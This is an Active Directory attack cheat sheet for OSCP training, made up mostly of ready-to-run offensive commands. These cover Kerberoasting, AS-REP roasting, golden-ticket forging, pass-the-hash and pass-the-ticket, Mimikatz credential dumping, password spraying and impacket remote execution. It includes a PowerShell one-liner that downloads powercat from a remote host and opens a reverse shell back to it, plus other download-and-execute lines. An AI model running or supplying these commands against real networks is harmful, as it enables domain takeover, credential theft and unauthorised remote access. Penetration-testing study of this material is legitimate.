# OSCP-Cheat-Sheets-AD

https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse \
https://0xsp.com/offensive/privilege-escalation-cheatsheet \
https://book.hacktricks.xyz/windows/active-directory-methodology \
https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a \
https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet \
https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory \
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md

```Shell
rdate -n 10.10.10.52
```

## Enumerate

### RPC
https://www.hackingarticles.in/active-directory-enumeration-rpcclient/

### Active Directory Enumeration: BloodHound
https://www.hackingarticles.in/active-directory-enumeration-bloodhound/

### Enumerate logged-in and sessions users
```console
powershell -executionpolicy bypass
PS C:\AD> Import-Module .\PowerView.ps1
PS C:\AD> Get-NetLoggedon -ComputerName dc01;
PS C:\AD> Get-NetSession -ComputerName dc01
PS C:\AD> IEX(New-Object System.Net.WebClient).DownloadString('http://<URL>/powerview.ps1');Get-NetLoggedon -ComputerName Tiger01;
```

### Enumerate Service Principal Names
https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/situational_awareness/network/Get-SPN.ps1
```console
GET-SPN -type service -search "MSSQLSvc"
GET-SPN -type service -search "HTTP"
GET-SPN -type service -search "*"
```
```console
$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
$objDomain = New-Object System.DirectoryServices.DirectoryEntry
$Searcher.SearchRoot = $objDomain
$Searcher.filter="serviceprincipalname=*http*"
$Result = $Searcher.FindAll()
Foreach($obj in $Result)
{
  Foreach($prop in $obj.Properties)
  {
    $prop
  }
}
```

### Local enumeration
https://www.jonathanmedd.net/wp-content/uploads/2009/10/ADPowerShell_QuickReference.pdf

#### Poweshell
https://www.hackingarticles.in/active-directory-enumeration-powerview/
```Shell
PS C:\> Set-ExecutionPolicy Unrestricted
Import-Module .\PowerView.ps1
Get-NetLoggedon -ComputerName pc-user
Get-NetSession -ComputerName dc01
```
User enumeration
```Shell
net user
net user /domain
net user admin /domain
net group /domain

```console
powershell -executionpolicy bypass -File enum-ad.ps1
```

#Get SID
wmic useraccount get name,sid
```

### Remote enumeration
#### User enumeration
https://github.com/insidetrust/statistically-likely-usernames \
#To Domain controller

```Shell
impacket-GetADUsers -all  yuncorp.local/ -dc-ip 192.168.100.20
impacket-GetADUsers -all  yuncorp.local/yenriquez:<pwd> -dc-ip 192.168.100.20
```
```Shell
nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='htb.local',userdb=/opt/SecLists/Usernames/Names/names.txt 10.10.10.52
kerbrute userenum --domain htb.local /opt/SecLists/Usernames/xato-net-10-million-usernames.txt --dc 10.10.10.52 
```

#### LDAP enumeration 
https://book.hacktricks.xyz/pentesting/pentesting-ldap

```Shell
 ldapdomaindump -u 'yuncorp.local\yenriquez' -p 'P@$$w0rd!' 192.168.100.20
```

 
## attacks

### Spray Password Spraying
https://www.hackingarticles.in/comprehensive-guide-on-password-spraying-attack/ \
https://www.hackingarticles.in/kerberos-brute-force-attack/
```console
crackmapexec smb <IP> -u users.txt -p passwords.txt
kerbrute bruteuser -d active --dc active.htb /usr/share/wordlists/rockyou.txt Administrator
```
```console
PS C:> .\Spray-Passwords.ps1 -Pass pass123 -Admin  # -File to wordlist, -Admin test acount admin
```

### Kerberoasting
#Service Account Attacks
https://www.hackingarticles.in/abusing-kerberos-using-impacket/ \
https://www.hackingarticles.in/kerberoasting-and-pass-the-ticket-attack-using-linux/ \
https://www.hackingarticles.in/deep-dive-into-kerberoasting-attack/

#### Local attack 

Mimikatz
```console
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
sekurlsa::tickets
```
Request TGS
```console
powershell
PS C:\> Set-ExecutionPolicy Unrestricted

Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'HTTP/CorpWebServer.corp.com'
klist
```
```console
mimikatz # kerberos::list /export
Invoke-Mimikatz -Command '"kerberos::list /export"'
python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt 1-40a50000-USER@HTTP~Corp.corp.com-CORP.COM.kirbi
```

Rubeus
https://github.com/r3motecontrol/Ghostpack-CompiledBinaries \
https://github.com/api0cradle/UltimateAppLockerByPassList/blob/master/Generic-AppLockerbypasses.md
```console
C:\> Rubeus.exe kerberoast /creduser:yuncorp.local\jenriquez /credpassword:<pass>
```

#### Request TGS

Impacket
```console
impacket-GetUserSPNs yuncorp.local/yenriquez -dc-ip 192.168.100.20  # know SPNs
impacket-GetUserSPNs -request 'yuncorp.local/yenriquez:P@$$w0rd!' -dc-ip 192.168.100.20 # Get TGS to any service
```
Invoke-kerberoast
https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1
```Shell
PS C:\> Set-ExecutionPolicy Unrestricted
PS C:\> import-module ./invoke-kerberoast.ps1
PS C:\> invoke-kerberoast -outputformat hashcat
```
```console
PS C:\> Set-ExecutionPolicy Unrestricted
PS C:\> import-module ./Invoke-Mimikatz.ps1
```
```console
hashcat -m 13100 -a 0 hash_spn.txt /usr/share/wordlists/rockyou.txt rockyou.txt --force
hashcat -m 13100 -a 0 hash_spn.txt /usr/share/wordlists/rockyou.txt --show --force
```

### ASPREPRoast - Get tickets without pwd
https://www.hackingarticles.in/as-rep-roasting/

#User configurate = DONT_REQ_PREAUTH - Create packet KRB_AS_REQ
```console
rpcclient -U "jenriquez" -W "yuncorp.local" 192.168.100.20
>enumdomusers
```
```console
impacket-GetNPUsers yuncorp.local/ -usersfile users.txt -format john -outputfile hash_2.txt -dc-ip 192.168.100.20 
impacket-GetNPUsers 'yuncorp.local/yenriquez:P@$$w0rd!' -format john -outputfile hash.txt -dc-ip 192.168.100.20
impacket-GetNPUsers 'yuncorp.local/yenriquez:P@$$w0rd!' -format hashcat -outputfile hash.txt -dc-ip 192.168.100.20
```
```console
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
hashcat -m 13100 -a 0 hash.txt /usr/share/wordlists/rockyou.txt --force
```

### Golden ticket attack - create TGT - first get the krbtgt hash NTLM 
https://www.hackingarticles.in/domain-persistence-golden-ticket-attack/ \
#Required Admin Domain - Attack to Domain controller

```console
powershell -ep bypass
PS C:\> Set-ExecutionPolicy Unrestricted
PS C:\> Import-Module .\Invoke-Mimikatz.ps1
PS C:\> Invoke-Mimikatz -Command '"lsadump::lsa /inject /name:krbtgt"' > output.txt
PS C:\> Invoke-Mimikatz -Command '"kerberos::golden /domain:yuncorp.local /sid:<sid> /rc4:<krbtgt hash> /user:Administrador /ticket:golden.kirbi"' # SID get output.txt

# Machine User Domain
mimikatz.exe
kerberos:ptt gold.kirbi
exit
>dir \\DC\admin$
>dir \\DC\c$

# get shell 
impacket-ticketer -nthash <krbtgt_ntlm> -domain-sid <sid> -domain yuncorp.local Administrator  #output Administrator.ccache
export KRB5CCNAME=/root/Administrator.ccache
impacket-psexec -k -n yuncorp.local/Administrator@DC-Corp cmd.exe   # Add domain in /etc/hosts
```

### Pass-the-Hash
https://www.hackingarticles.in/lateral-movement-pass-the-hash-attack/
```console
kali@kali:~$ pth-winexe -U user%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.11.0.22 cmd
```

### Overpass-the-Hash - Request ticket with NTLM
https://www.hackingarticles.in/lateral-movement-over-pass-the-hash/

Dumps the cached password hashes
```console
mimikatz # sekurlsa::logonpasswords
```
```console
mimikatz # sekurlsa::pth /user:sec_admin /domain:corporate.com /ntlm:e2b475c11da2a0748290d87aa966c327 /run:PowerShell.exe
PS C:\Windows\system32> klist   # list the cached Kerberos tickets
PS C:\Windows\system32> net use \\dc01    # No Kerberos tickets have been cached
PS C:\Windows\system32> klist
PS C:> .\PsExec.exe \\dc01 cmd.exe
```

### Pass-the-ticket - takes advantage of the TGS
https://www.hackingarticles.in/lateral-movement-pass-the-ticket-attack/
https://www.hackingarticles.in/lateral-movement-pass-the-ccache/

Get SID
```console
whoami /user
```
```console
#flush any existing Kerberos ticket
mimikatz # kerberos::purge
mimikatz # kerberos::list
```
```console
mimikatz # kerberos::golden /user:sec /domain:corporate.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /target:CorporateWebServer.corporate.com /service:HTTP /rc4:E2B475C11DA2A0748290D87AA966C327 /ptt
```

### LAPS
https://www.hackingarticles.in/credential-dumpinglaps/

### Domain Persistence: Golden Certificate Attack
https://www.hackingarticles.in/domain-persistence-golden-certificate-attack/

### Domain Persistence: DC Shadow Attack
https://www.hackingarticles.in/domain-persistence-dc-shadow-attack/

### Domain Persistence AdminSDHolder
https://www.hackingarticles.in/domain-persistence-adminsdholder/


### Exploits
#### Kerberos MS14-068
https://wizard32.net/blog/knock-and-pass-kerberos-exploitation.html \
https://raw.githubusercontent.com/mubix/pykek/master/ms14-068.py
```console
impacket-goldenPac 'htb.local/james:J@m3s_P@ssW0rd!@mantis.htb.local'
```

### SYSVOL
```console
#Groups.xml
gpp-decrypt <pwd>
```

### Crackmapexec
https://mpgn.gitbook.io/crackmapexec/getting-started/using-kerberos

```console
crackmapexec smb 192.168.100.0/24 
```



## Utils

### RCE Impaket
https://www.hackingarticles.in/remote-code-execution-using-impacket/

```Shell
cmd /c reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
impacket-psexec yuncorp.local/Administrator:P@\$\$w0rd\!@192.168.100.19 cmd.exe
impacket-psexec workgroup/root:pwd@192.168.100.19 cmd.exe
```
```Shell
crackmapexec smb 192.168.100.19 -u root -p <pwd> --local-auth -x whoami 
https://www.hackingarticles.in/lateral-moment-on-active-directory-crackmapexec/
```
```Shell
powershell -exec Bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://192.168.100.17/powercat.ps1');powercat -c 192.168.100.17 -p 443 -e cmd"
```

#PowerShell
https://sp00ks-git.github.io/posts/CLM-Bypass/ \
https://github.com/calebstewart/bypass-clm \
https://github.com/padovah4ck/PSByPassCLM \
https://pentestlab.blog/2017/05/23/applocker-bypass-rundll32/ \
https://pentestlab.blog/2017/05/29/applocker-bypass-msbuild/ 

#Macros
https://www.hackingarticles.in/multiple-ways-to-exploit-windows-systems-using-macros/

https://www.hackingarticles.in/windows-for-pentester-bitsadmin/
https://www.hackingarticles.in/windows-for-pentester-certutil/

### Credential Dumping: Domain Cache Credential
https://www.hackingarticles.in/credential-dumping-domain-cache-credential/ \
https://www.hackingarticles.in/credential-dumping-dcsync-attack/ \
https://www.hackingarticles.in/credential-dumping-local-security-authority-lsalsass-exe/ \
https://www.hackingarticles.in/credential-dumping-ntds-dit/ \
https://www.hackingarticles.in/credential-dumping-sam/ \
https://www.hackingarticles.in/credential-dumping-wdigest/
https://www.hackingarticles.in/credential-dumping-windows-credential-manager/ \

### Kerberos Authentication

Process
1. User logs in workstation -- -AS-REQ_TGT --> KDC.  # REQ_TGT = timestamp encrypted with hash password NTLM + user
2. KDC -- AS-REP --> client. # AS_REP = Session key(encrypted user password hash) + TGT (key session encrypted krbtgt NT hash KDC)(include info user and groups).
#Finish KDC considers the client authentication complete

To access resources of the domain, such as application with a registered SPN
1. Client -- TGS_REQ --> DC-KDC  # TGS_REQ (user and timestamp encrypted using the session key + SPN of the resource + TGT)
2. DC-KDC TGT decrypted_secret_key -- TGS_REP -->  Client.   # TGS_REP (SPN + session key to client and SPN) encrypted_session_key_TGT + (service ticket) encrypted_password_hash
3. Cliente -- AP_ REQ --> Application.  # AP_REQ = Username + timestamp encrypted with the session key associated with the service ticket
4. Application -- Service Autenticacion --> Client.
